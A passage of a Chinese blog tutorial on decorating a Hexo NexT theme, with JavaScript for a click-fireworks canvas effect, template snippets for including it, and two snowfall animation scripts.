function_">apply</span>(n,i)&#125;,t)&#125;&#125;<span class="hljs-keyword">var</span> canvasEl=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.fireworks&quot;</span>);<span class="hljs-keyword">if</span>(canvasEl)&#123;<span class="hljs-keyword">var</span> ctx=canvasEl.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&quot;2d&quot;</span>),numberOfParticules=<span class="hljs-number">30</span>,pointerX=<span class="hljs-number">0</span>,pointerY=<span class="hljs-number">0</span>,tap=<span class="hljs-string">&quot;mousedown&quot;</span>,colors=[<span class="hljs-string">&quot;#FF1461&quot;</span>,<span class="hljs-string">&quot;#18FF92&quot;</span>,<span class="hljs-string">&quot;#5A87FF&quot;</span>,<span class="hljs-string">&quot;#FBF38C&quot;</span>],setCanvasSize=<span class="hljs-title function_">debounce</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;canvasEl.<span class="hljs-property">width</span>=<span class="hljs-number">2</span>*<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,canvasEl.<span class="hljs-property">height</span>=<span class="hljs-number">2</span>*<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>,canvasEl.<span class="hljs-property">style</span>.<span class="hljs-property">width</span>=<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.<span class="hljs-property">style</span>.<span class="hljs-property">height</span>=<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&quot;2d&quot;</span>).<span class="hljs-title function_">scale</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)&#125;,<span class="hljs-number">500</span>),render=<span class="hljs-title function_">anime</span>(&#123;<span class="hljs-attr">duration</span>:<span class="hljs-number">1</span>/<span class="hljs-number">0</span>,<span class="hljs-attr">update</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;ctx.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,canvasEl.<span class="hljs-property">width</span>,canvasEl.<span class="hljs-property">height</span>)&#125;&#125;);<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(tap,<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-string">&quot;sidebar&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">id</span>&amp;&amp;<span class="hljs-string">&quot;toggle-sidebar&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">id</span>&amp;&amp;<span class="hljs-string">&quot;A&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">nodeName</span>&amp;&amp;<span class="hljs-string">&quot;IMG&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">nodeName</span>&amp;&amp;(render.<span class="hljs-title function_">play</span>(),<span class="hljs-title function_">updateCoords</span>(e),<span class="hljs-title function_">animateParticules</span>(pointerX,pointerY))&#125;,!<span class="hljs-number">1</span>),<span class="hljs-title function_">setCanvasSize</span>(),<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;resize&quot;</span>,setCanvasSize,!<span class="hljs-number">1</span>)&#125;<span class="hljs-string">&quot;use strict&quot;</span>;<span class="hljs-keyword">function</span> <span class="hljs-title function_">updateCoords</span>(<span class="hljs-params">e</span>)&#123;pointerX=(e.<span class="hljs-property">clientX</span>||e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">clientX</span>)-canvasEl.<span class="hljs-title function_">getBoundingClientRect</span>().<span class="hljs-property">left</span>,pointerY=e.<span class="hljs-property">clientY</span>||e.<span class="hljs-property">touches</span>[<span class="hljs-number">0</span>].<span class="hljs-property">clientY</span>-canvasEl.<span class="hljs-title function_">getBoundingClientRect</span>().<span class="hljs-property">top</span>&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">setParticuleDirection</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">var</span> t=anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">0</span>,<span class="hljs-number">360</span>)*<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>/<span class="hljs-number">180</span>,a=anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">50</span>,<span class="hljs-number">180</span>),n=[-<span class="hljs-number">1</span>,<span class="hljs-number">1</span>][anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]*a;<span class="hljs-keyword">return</span>&#123;<span class="hljs-attr">x</span>:e.<span class="hljs-property">x</span>+n*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">cos</span>(t),<span class="hljs-attr">y</span>:e.<span class="hljs-property">y</span>+n*<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sin</span>(t)&#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">createParticule</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">var</span> a=&#123;&#125;;<span class="hljs-keyword">return</span> a.<span class="hljs-property">x</span>=e,a.<span class="hljs-property">y</span>=t,a.<span class="hljs-property">color</span>=colors[anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">0</span>,colors.<span class="hljs-property">length</span>-<span class="hljs-number">1</span>)],a.<span class="hljs-property">radius</span>=anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">16</span>,<span class="hljs-number">32</span>),a.<span class="hljs-property">endPos</span>=<span class="hljs-title function_">setParticuleDirection</span>(a),a.<span class="hljs-property">draw</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;ctx.<span class="hljs-title function_">beginPath</span>(),ctx.<span class="hljs-title function_">arc</span>(a.<span class="hljs-property">x</span>,a.<span class="hljs-property">y</span>,a.<span class="hljs-property">radius</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>,!<span class="hljs-number">0</span>),ctx.<span class="hljs-property">fillStyle</span>=a.<span class="hljs-property">color</span>,ctx.<span class="hljs-title function_">fill</span>()&#125;,a&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">createCircle</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">var</span> a=&#123;&#125;;<span class="hljs-keyword">return</span> a.<span class="hljs-property">x</span>=e,a.<span class="hljs-property">y</span>=t,a.<span class="hljs-property">color</span>=<span class="hljs-string">&quot;#F00&quot;</span>,a.<span class="hljs-property">radius</span>=<span class="hljs-number">0.1</span>,a.<span class="hljs-property">alpha</span>=<span class="hljs-number">0.5</span>,a.<span class="hljs-property">lineWidth</span>=<span class="hljs-number">6</span>,a.<span class="hljs-property">draw</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;ctx.<span class="hljs-property">globalAlpha</span>=a.<span class="hljs-property">alpha</span>,ctx.<span class="hljs-title function_">beginPath</span>(),ctx.<span class="hljs-title function_">arc</span>(a.<span class="hljs-property">x</span>,a.<span class="hljs-property">y</span>,a.<span class="hljs-property">radius</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>,!<span class="hljs-number">0</span>),ctx.<span class="hljs-property">lineWidth</span>=a.<span class="hljs-property">lineWidth</span>,ctx.<span class="hljs-property">strokeStyle</span>=a.<span class="hljs-property">color</span>,ctx.<span class="hljs-title function_">stroke</span>(),ctx.<span class="hljs-property">globalAlpha</span>=<span class="hljs-number">1</span>&#125;,a&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">renderParticule</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> t=<span class="hljs-number">0</span>;t&lt;e.<span class="hljs-property">animatables</span>.<span class="hljs-property">length</span>;t++)&#123;e.<span class="hljs-property">animatables</span>[t].<span class="hljs-property">target</span>.<span class="hljs-title function_">draw</span>()&#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">animateParticules</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> a=<span class="hljs-title function_">createCircle</span>(e,t),n=[],i=<span class="hljs-number">0</span>;i&lt;numberOfParticules;i++)&#123;n.<span class="hljs-title function_">push</span>(<span class="hljs-title function_">createParticule</span>(e,t))&#125;anime.<span class="hljs-title function_">timeline</span>().<span class="hljs-title function_">add</span>(&#123;<span class="hljs-attr">targets</span>:n,<span class="hljs-attr">x</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">return</span> e.<span class="hljs-property">endPos</span>.<span class="hljs-property">x</span>&#125;,<span class="hljs-attr">y</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">return</span> e.<span class="hljs-property">endPos</span>.<span class="hljs-property">y</span>&#125;,<span class="hljs-attr">radius</span>:<span class="hljs-number">0.1</span>,<span class="hljs-attr">duration</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),<span class="hljs-attr">easing</span>:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,<span class="hljs-attr">update</span>:renderParticule&#125;).<span class="hljs-title function_">add</span>(&#123;<span class="hljs-attr">targets</span>:a,<span class="hljs-attr">radius</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">80</span>,<span class="hljs-number">160</span>),<span class="hljs-attr">lineWidth</span>:<span class="hljs-number">0</span>,<span class="hljs-attr">alpha</span>:&#123;<span class="hljs-attr">value</span>:<span class="hljs-number">0</span>,<span class="hljs-attr">easing</span>:<span class="hljs-string">&quot;linear&quot;</span>,<span class="hljs-attr">duration</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">600</span>,<span class="hljs-number">800</span>)&#125;,<span class="hljs-attr">duration</span>:anime.<span class="hljs-title function_">random</span>(<span class="hljs-number">1200</span>,<span class="hljs-number">1800</span>),<span class="hljs-attr">easing</span>:<span class="hljs-string">&quot;easeOutExpo&quot;</span>,<span class="hljs-attr">update</span>:renderParticule,<span class="hljs-attr">offset</span>:<span class="hljs-number">0</span>&#125;)&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">e,t</span>)&#123;<span class="hljs-keyword">var</span> a;<span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">var</span> n=<span class="hljs-variable language_">this</span>,i=<span class="hljs-variable language_">arguments</span>;<span class="hljs-built_in">clearTimeout</span>(a),a=<span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;e.<span class="hljs-title function_">apply</span>(n,i)&#125;,t)&#125;&#125;<span class="hljs-keyword">var</span> canvasEl=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.fireworks&quot;</span>);<span class="hljs-keyword">if</span>(canvasEl)&#123;<span class="hljs-keyword">var</span> ctx=canvasEl.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&quot;2d&quot;</span>),numberOfParticules=<span class="hljs-number">30</span>,pointerX=<span class="hljs-number">0</span>,pointerY=<span class="hljs-number">0</span>,tap=<span class="hljs-string">&quot;mousedown&quot;</span>,colors=[<span class="hljs-string">&quot;#FF1461&quot;</span>,<span class="hljs-string">&quot;#18FF92&quot;</span>,<span class="hljs-string">&quot;#5A87FF&quot;</span>,<span class="hljs-string">&quot;#FBF38C&quot;</span>],setCanvasSize=<span class="hljs-title function_">debounce</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;canvasEl.<span class="hljs-property">width</span>=<span class="hljs-number">2</span>*<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,canvasEl.<span class="hljs-property">height</span>=<span class="hljs-number">2</span>*<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>,canvasEl.<span class="hljs-property">style</span>.<span class="hljs-property">width</span>=<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.<span class="hljs-property">style</span>.<span class="hljs-property">height</span>=<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>+<span class="hljs-string">&quot;px&quot;</span>,canvasEl.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&quot;2d&quot;</span>).<span class="hljs-title function_">scale</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)&#125;,<span class="hljs-number">500</span>),render=<span class="hljs-title function_">anime</span>(&#123;<span class="hljs-attr">duration</span>:<span class="hljs-number">1</span>/<span class="hljs-number">0</span>,<span class="hljs-attr">update</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;ctx.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,canvasEl.<span class="hljs-property">width</span>,canvasEl.<span class="hljs-property">height</span>)&#125;&#125;);<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(tap,<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-string">&quot;sidebar&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">id</span>&amp;&amp;<span class="hljs-string">&quot;toggle-sidebar&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">id</span>&amp;&amp;<span class="hljs-string">&quot;A&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">nodeName</span>&amp;&amp;<span class="hljs-string">&quot;IMG&quot;</span>!==e.<span class="hljs-property">target</span>.<span class="hljs-property">nodeName</span>&amp;&amp;(render.<span class="hljs-title function_">play</span>(),<span class="hljs-title function_">updateCoords</span>(e),<span class="hljs-title function_">animateParticules</span>(pointerX,pointerY))&#125;,!<span class="hljs-number">1</span>),<span class="hljs-title function_">setCanvasSize</span>(),<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;resize&quot;</span>,setCanvasSize,!<span class="hljs-number">1</span>)&#125;;<br></code></pre></td></tr></table></figure><p>添加代码于**_layout.swig**末尾。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--单击烟花效果--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fireworks&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/fireworks.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="二、背景添加小动画"><a href="#二、背景添加小动画" class="headerlink" title="二、背景添加小动画"></a>二、背景添加小动画</h1><h2 id="1-官方小动画"><a href="#1-官方小动画" class="headerlink" title="1.官方小动画"></a>1.官方小动画</h2><p>其实官方就已经有背景小动画了，给了四种，在config里可设置。</p><p><img src="https://i.loli.net/2019/08/08/OG7jmAxvrISgs42.jpg" alt="screenshot.2.jpg"></p><p>其他几种对于我来说真的太花了，于是选择了第一种。</p><h2 id="2-飘雪动画"><a href="#2-飘雪动画" class="headerlink" title="2.飘雪动画"></a>2.飘雪动画</h2><p>在<strong>\themes\next\source\js</strong>下新建<strong>snow.js</strong>文件。</p><p>有两种样式，看喜好取舍（个人偏好样式2）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/*样式一*/</span><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params">$</span>)&#123;<br>$.fn.<span class="hljs-property">snow</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">options</span>)&#123;<br><span class="hljs-keyword">var</span> $flake = $(<span class="hljs-string">&#x27;&lt;div id=&quot;snowbox&quot; /&gt;&#x27;</span>).<span class="hljs-title function_">css</span>(&#123;<span class="hljs-string">&#x27;position&#x27;</span>: <span class="hljs-string">&#x27;absolute&#x27;</span>,<span class="hljs-string">&#x27;z-index&#x27;</span>:<span class="hljs-string">&#x27;9999&#x27;</span>, <span class="hljs-string">&#x27;top&#x27;</span>: <span class="hljs-string">&#x27;-50px&#x27;</span>&#125;).<span class="hljs-title function_">html</span>(<span class="hljs-string">&#x27;&amp;#10052;&#x27;</span>),<br>documentHeight = $(<span class="hljs-variable language_">document</span>).<span class="hljs-title function_">height</span>(),<br>documentWidth= $(<span class="hljs-variable language_">document</span>).<span class="hljs-title function_">width</span>(),<br>defaults = &#123;<br>minSize: <span class="hljs-number">10</span>,<br>maxSize: <span class="hljs-number">20</span>,<br>newOn: <span class="hljs-number">1000</span>,<br>flakeColor: <span class="hljs-string">&quot;#AFDAEF&quot;</span> <span class="hljs-comment">/* 此处可以定义雪花颜色，若要白色可以改为#FFFFFF */</span><br>&#125;,<br>options= $.<span class="hljs-title function_">extend</span>(&#123;&#125;, defaults, options);<br><span class="hljs-keyword">var</span> interval= <span class="hljs-built_in">setInterval</span>( <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">var</span> startPositionLeft = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * documentWidth - <span class="hljs-number">100</span>,<br>startOpacity = <span class="hljs-number">0.5</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>(),<br>sizeFlake = options.<span class="hljs-property">minSize</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * options.<span class="hljs-property">maxSize</span>,<br>endPositionTop = documentHeight - <span class="hljs-number">200</span>,<br>endPositionLeft = startPositionLeft - <span class="hljs-number">500</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">500</span>,<br>durationFall = documentHeight * <span class="hljs-number">10</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">5000</span>;<br>$flake.<span class="hljs-title function_">clone</span>().<span class="hljs-title function_">appendTo</span>(<span class="hljs-string">&#x27;body&#x27;</span>).<span class="hljs-title function_">css</span>(&#123;<br><span class="hljs-attr">left</span>: startPositionLeft,<br><span class="hljs-attr">opacity</span>: startOpacity,<br><span class="hljs-string">&#x27;font-size&#x27;</span>: sizeFlake,<br><span class="hljs-attr">color</span>: options.<span class="hljs-property">flakeColor</span><br>&#125;).<span class="hljs-title function_">animate</span>(&#123;<br><span class="hljs-attr">top</span>: endPositionTop,<br><span class="hljs-attr">left</span>: endPositionLeft,<br><span class="hljs-attr">opacity</span>: <span class="hljs-number">0.2</span><br>&#125;,durationFall,<span class="hljs-string">&#x27;linear&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>$(<span class="hljs-variable language_">this</span>).<span class="hljs-title function_">remove</span>()<br>&#125;);<br>&#125;, options.<span class="hljs-property">newOn</span>);<br>    &#125;;<br>&#125;)(jQuery);<br>$(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    $.fn.<span class="hljs-title function_">snow</span>(&#123; <br>    <span class="hljs-attr">minSize</span>: <span class="hljs-number">5</span>, <span class="hljs-comment">/* 定义雪花最小尺寸 */</span><br>    <span class="hljs-attr">maxSize</span>: <span class="hljs-number">50</span>,<span class="hljs-comment">/* 定义雪花最大尺寸 */</span><br>    <span class="hljs-attr">newOn</span>: <span class="hljs-number">300</span>  <span class="hljs-comment">/* 定义密集程度，数字越小越密集 */</span><br>    &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/*样式二*/</span><br><span class="hljs-comment">/* 控制下雪 */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">snowFall</span>(<span class="hljs-params">snow</span>) &#123;<br>    <span class="hljs-comment">/* 可配置属性 */</span><br>    snow = snow || &#123;&#125;;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxFlake</span> = snow.<span class="hljs-property">maxFlake</span> || <span class="hljs-number">200</span>;   <span class="hljs-comment">/* 最多片数 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">flakeSize</span> = snow.<span class="hljs-property">flakeSize</span> || <span class="hljs-number">10</span>;  <span class="hljs-comment">/* 雪花形状 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fallSpeed</span> = snow.<span class="hljs-property">fallSpeed</span> || <span class="hljs-number">1</span>;   <span class="hljs-comment">/* 坠落速度 */</span><br>&#125;<br><span class="hljs-comment">/* 兼容写法 */</span><br>requestAnimationFrame = <span class="hljs-variable language_">window</span>.<span class="hljs-property">requestAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">mozRequestAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">webkitRequestAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">msRequestAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">oRequestAnimationFrame</span> ||<br>    <span class="hljs-keyword">function</span>(<span class="hljs-params">callback</span>) &#123; <span class="hljs-built_in">setTimeout</span>(callback, <span class="hljs-number">1000</span> / <span class="hljs-number">60</span>); &#125;;<br><br>cancelAnimationFrame = <span class="hljs-variable language_">window</span>.<span class="hljs-property">cancelAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">mozCancelAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">webkitCancelAnimationFrame</span> ||<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">msCancelAnimationFrame</span> ||<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">oCancelAnimationFrame</span>;<br><span class="hljs-comment">/* 开始下雪 */</span><br>snowFall.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">start</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">/* 创建画布 */</span><br>    snowCanvas.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-comment">/* 创建雪花形状 */</span><br>    createFlakes.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-comment">/* 画雪 */</span><br>    drawSnow.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>)<br>&#125;<br><span class="hljs-comment">/* 创建画布 */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">snowCanvas</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">/* 添加Dom结点 */</span><br>    <span class="hljs-keyword">var</span> snowcanvas = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;canvas&quot;</span>);<br>    snowcanvas.<span class="hljs-property">id</span> = <span class="hljs-string">&quot;snowfall&quot;</span>;<br>    snowcanvas.<span class="hljs-property">width</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>;<br>    snowcanvas.<span class="hljs-property">height</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">clientHeight</span>;<br>    snowcanvas.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;style&quot;</span>, <span class="hljs-string">&quot;position:absolute; top: 0; left: 0; z-index: 1; pointer-events: none;&quot;</span>);<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;body&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">appendChild</span>(snowcanvas);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span> = snowcanvas;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span> = snowcanvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&quot;2d&quot;</span>);<br>    <span class="hljs-comment">/* 窗口大小改变的处理 */</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onresize</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        snowcanvas.<span class="hljs-property">width</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>;<br>        <span class="hljs-comment">/* snowcanvas.height = window.innerHeight */</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">/* 雪运动对象 */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">flakeMove</span>(<span class="hljs-params">canvasWidth, canvasHeight, flakeSize, fallSpeed</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * canvasWidth);   <span class="hljs-comment">/* x坐标 */</span><br>    <span class="hljs-variable 